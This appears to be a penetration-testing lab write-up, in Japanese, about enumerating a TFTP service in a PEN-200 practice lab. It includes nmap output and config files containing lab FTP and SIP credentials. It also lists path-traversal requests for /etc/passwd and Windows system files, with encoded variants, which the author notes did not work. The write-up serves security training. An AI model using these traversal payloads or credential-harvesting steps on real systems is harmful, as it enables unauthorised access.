>TFTP（Trivial File Transfer Protocol）は、最もシンプルなファイル転送プロトコルの一つです。UDPポート69番で動作し、ユーザー認証や暗号化を必要とせずにファイル転送が可能です。TFTPのシンプルさは、VoIP端末などのデバイスへの設定ファイルやROMイメージの展開といった内部ネットワーク操作に有効ですが、同時に深刻なセキュリティリスクも招きます。

- 参考
	- https://hackviser.com/tactics/pentesting/services/tftp

# Nmap

```zsh
PORT   STATE SERVICE REASON  VERSION
69/udp    open          tftp           Netkit tftpd or atftpd
```

---

# Enumeration

- ファイルがいくつか見つかったので、tftpでアクセスし、ファイルをダウンロードした
```sh
$ nmap -n -Pn -sU -p69 -sV --script tftp-enum $TargetIP
PORT STATE SERVICE VERSION 
69/udp open tftp Netkit tftpd or atftpd 
 tftp-enum 
   backup.cfg
   sip-confg
   sip.cfg
   sip_327.cfg
```

### backup.cfg

```sh
┌──(koshi㉿kali)-[~/PEN-200/Skylark/VM14]
└─$ cat backup.cfg                         
FTP credentials for umbraco web application upgrade:

ftp_jp
~be<3@6fe1Z:2e8
```

### sip-confg→特になし

```sh
┌──(koshi㉿kali)-[~/PEN-200/Skylark/VM14]
└─$ cat sip-confg 
# Properties common for all protocols
net.java.sip.communicator.service.protocol.DTMF_METHOD=AUTO_DTMF
net.java.sip.communicator.service.protocol.DTMF_MINIMAL_TONE_DURATION=70
# SIP specific properties
net.java.sip.communicator.service.protocol.sip.SERVER_PORT=5060
...
```

### sip.cfg

```sh
┌──(koshi㉿kali)-[~/PEN-200/Skylark/VM14]
└─$ cat sip.cfg  
[misc]
log_collection_upload_server_url=https://www.linphone.org:444/lft.php
prefer_basic_chat_room=1
uuid=11ca34e7-4c29-0070-a37c-6a329e977275
hide_empty_chat_rooms=0
file_transfer_server_url=https://www.linphone.org:444/lft.php
...

[auth_info_0]
username=l.nguyen
userid=l.nguyen
passwd=ChangeMePlease__XMPPTest

[auth_info_1]
username=j.jameson
userid=j.jameson
passwd=ChangeMePlease__XMPPTest

[auth_info_2]
username=j.jones
userid=j.jones
passwd=ChangeMePlease__XMPPTest

[proxy_0]
reg_proxy=<sip:172.16.50.32;transport=tls>
reg_identity=sip:l.nguyen@skylark.com
realm=sip.linphone.org
quality_reporting_collector=sip:voip-metrics@sip.linphone.org;transport=tls
quality_reporting_enabled=1
quality_reporting_interval=180
reg_expires=600
reg_sendregister=0
publish=0
avpf=-1
avpf_rr_interval=1
dial_escape_plus=0
use_dial_prefix_for_calls_and_chats=1
privacy=32768
push_notification_allowed=0
remote_push_notification_allowed=0
cpim_in_basic_chat_rooms_enabled=1
idkey=proxy_config_~WjXyb2WdBWMb2C
publish_expires=0
nat_policy_ref=olAoFDLyvvfk39w
conference_factory_uri=sip:conference-factory@sip.linphone.org

[proxy_1]
reg_proxy=<sip:172.16.50.32;transport=tls>
reg_identity=sip:j.jones@skylark.com
realm=sip.linphone.org
quality_reporting_collector=sip:voip-metrics@sip.linphone.org;transport=tls
quality_reporting_enabled=1
quality_reporting_interval=180
reg_expires=600
reg_sendregister=0
publish=0
avpf=-1
avpf_rr_interval=1
dial_escape_plus=0
use_dial_prefix_for_calls_and_chats=1
privacy=32768
push_notification_allowed=0
remote_push_notification_allowed=0
cpim_in_basic_chat_rooms_enabled=1
idkey=proxy_config_7vBEtYkTrruvfT2
publish_expires=0
nat_policy_ref=qdY3XE30EZHSTo5
conference_factory_uri=sip:conference-factory@sip.linphone.org

[proxy_2]
reg_proxy=<sip:172.16.50.32;transport=tls>
reg_identity=sip:j.jameson@skylark.com
realm=sip.linphone.org
quality_reporting_collector=sip:voip-metrics@sip.linphone.org;transport=tls
quality_reporting_enabled=1
quality_reporting_interval=180
reg_expires=600
reg_sendregister=0
publish=0
avpf=-1
avpf_rr_interval=1
dial_escape_plus=0
use_dial_prefix_for_calls_and_chats=1
privacy=32768
push_notification_allowed=0
remote_push_notification_allowed=0
cpim_in_basic_chat_rooms_enabled=1
idkey=proxy_config_TyhsjEkUSFxpkxA
publish_expires=0
nat_policy_ref=x9Q58Jqg3ZDHHP6
conference_factory_uri=sip:conference-factory@sip.linphone.org

```

### sip_327.cfg

```sh
┌──(koshi㉿kali)-[~/PEN-200/Skylark/VM14]
└─$ cat sip_327.cfg
<?xml version="1.0"?>
<options>
  <general>
    <account>Z834263d721f12beb302b8b2</account>

...
      <ident>Z834263d721f12beb302b8b2</ident>
      <name>reynolds@testing.com</name>
      <save_username>true</save_username>
      <username>reynolds</username>
      <save_password>true</save_password>
      <password>bj1ZzWEmJd870YHMsV+NdfsTuce+zsQRyvb7e5fIgY8=
</password>
```
- これはhash値ではない
- `reynolds@testing.com`と検索しても出てこないので、認証情報化と思う


---

# Exploit

- 以下は失敗
```sh
# Try path traversal
tftp target.com <<EOF
get ../../../etc/passwd
get ..\..\..\..\windows\win.ini
get ../../boot.ini
quit
EOF

# URL encoded
get %2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoding
get %252e%252e%252fetc%252fpasswd
```


---

# Screenshot


